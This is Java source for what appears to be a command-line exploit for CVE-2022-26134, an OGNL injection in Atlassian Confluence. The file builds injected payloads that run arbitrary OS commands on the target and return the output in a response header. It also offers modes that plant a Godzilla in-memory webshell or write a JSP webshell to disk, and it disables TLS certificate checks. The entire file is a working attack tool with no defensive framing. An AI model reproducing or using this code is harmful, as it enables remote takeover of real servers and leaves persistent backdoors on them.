package main;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.BasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.Options;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.util.Base64;
import java.util.UUID;

public class Main {
    public static void main(String[] args) throws Throwable{
        CommandLineParser parser = new BasicParser( );
        Options options = new Options( );
        options.addOption("h", "help", false, "Print this usage information");
        options.addOption("t", "type", true, "Print this usage information");
        options.addOption("u", "uri", true, "uri" );
        options.addOption("p", "password", true, "password of Godzilla");
        options.addOption("k", "key", true, "key of Godzilla");
        options.addOption("c", "command", true, "command");
        options.addOption("f", "filename", true, "filename");
        options.addOption("co", "content", true, "content");
        CommandLine commandLine = parser.parse( options, args );

        if( commandLine.hasOption('h') || !commandLine.hasOption("type") ) {
            System.out.println("[*] help: \n" +
                    "\tjava -jar CVE-2022-26134.jar --uri http://127.0.0.1:8090/ --type rce --command whoami\n" +
                    "\tjava -jar CVE-2022-26134.jar --uri http://127.0.0.1:8090/ --type memshell --password pass --key key\n" +
                    "\tjava -jar CVE-2022-26134.jar --uri http://127.0.0.1:8090/ --type webshell --filename 1.jsp --content YWFh");
            System.exit(0);
        }

        String uriPayload = "";
        String evilContent = "";
        if (commandLine.hasOption("type")){
            switch (commandLine.getOptionValue("type")){
                case "rce":
                    String cmd = commandLine.getOptionValue('c');
                    uriPayload = "var s='';var cmds = java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.lang.String\"),3);" +
                            "if(java.io.File.separator.equals(\"/\")){cmds[0]=\"/bin/sh\";cmds[1]=\"-c\";cmds[2]=\""+cmd+"\";}" +
                            "else{cmds[0]=\"cmd.exe\";cmds[1]=\"/C\";cmds[2]=\""+cmd+"\";};" +
                            "var pp = java.lang.Runtime.getRuntime().exec(cmds).getInputStream();" +
                            "while (1) {var b = pp.read();if (b == -1) {break;}s=s+String.fromCharCode(b)};s\n";
                    break;
                case "memshell":
                    String password = commandLine.getOptionValue('p');
                    String key = commandLine.getOptionValue('k');
                    CtClass ctClass = ClassPool.getDefault().get("main.MemShell");
                    ctClass.makeClassInitializer().insertBefore(String.format("password = \"%s\";\n" +
                            "     key = \"%s\";\n",password,md5(key).substring(0, 16).toLowerCase()));
                    ctClass.setName("com.opensymphony.xwork." + UUID.randomUUID().toString().replace("-", ""));
                    evilContent = Base64.getEncoder().encodeToString(ctClass.toBytecode());
                    evilContent = "search=" + URLEncoder.encode(evilContent);
                    uriPayload = memshell(ctClass.getName());
                    break;
                case "webshell":
                    uriPayload = upload();
                    evilContent = "filename=" + URLEncoder.encode(commandLine.getOptionValue('f')) +
                            "&search=" + URLEncoder.encode(commandLine.getOptionValue("co"));
                    break;
            }
        }

        String template = "${Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getResponse\",null)" +
                ".invoke(null,null).setHeader(\"X-Status\",Class.forName(\"javax.script.ScriptEngineManager\").newInstance()." +
                "getEngineByName(\"nashorn\").eval(\"eval(String.fromCharCode({payload}))\"))}";
        uriPayload = URLEncoder.encode(template.replace("{payload}", StringUtils.stringToAscii(uriPayload)));

        String url = commandLine.getOptionValue('u');
        System.out.println("[*] url: " + url);

        MiTM.trustAllHttpsCertificates();


        if (!url.endsWith("/")){
            uriPayload = "/" + uriPayload;
        }
        url = url + uriPayload + "/";
        System.out.println("[*] send payload");

        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8081));
        HttpURLConnection urlConnection = (HttpURLConnection) new URL(url).openConnection();
        urlConnection.setInstanceFollowRedirects(false);
        urlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0");
        urlConnection.setDoOutput(true);
        urlConnection.setDoInput(true);
        OutputStream outputStream = urlConnection.getOutputStream();



        outputStream.write(evilContent.getBytes());
        outputStream.flush();
        outputStream.close();
        if (commandLine.hasOption('t')){
            switch (commandLine.getOptionValue('t')){
                case "rce":
                    System.out.println("[*] result: " + urlConnection.getHeaderField("X-Status"));
                    break;
                case "memshell":
                    if ("ok".equals(urlConnection.getHeaderField("X-Status"))) {
                        System.out.println("[*] exploit success");
                        System.out.println("[*] godzilla webshell password : " + commandLine.getOptionValue('p'));
                        System.out.println("[*] godzilla webshell key : " + commandLine.getOptionValue('k'));
                    }else {
                        System.out.println("[*] exploit fail");
                    }
                    break;
                case "webshell":
                    if ("ok".equals(urlConnection.getHeaderField("X-Status"))) {
                        System.out.println("[*] exploit success");
                        System.out.println("[*] godzilla webshell filename : " + commandLine.getOptionValue('f'));
                    }else {
                        System.out.println("[*] exploit fail");
                    }
                    break;
            }
        }
    }

    private static String upload() {
        return new String(readInputStream(Main.class.getResourceAsStream("2.js")));
    }

    private static String memshell(String className) {
        String payload = new String(readInputStream(Main.class.getResourceAsStream("1.js")));
        payload = payload.replace("{className}", className);
        return payload;
    }

    public static byte[] readInputStream(InputStream inputStream) {
        byte[] temp = new byte[4096];
        int readOneNum = 0;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while ((readOneNum = inputStream.read(temp)) != -1) {
                bos.write(temp, 0, readOneNum);
            }
            inputStream.close();
        }catch (Exception e){
        }
        return bos.toByteArray();
    }
    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

}
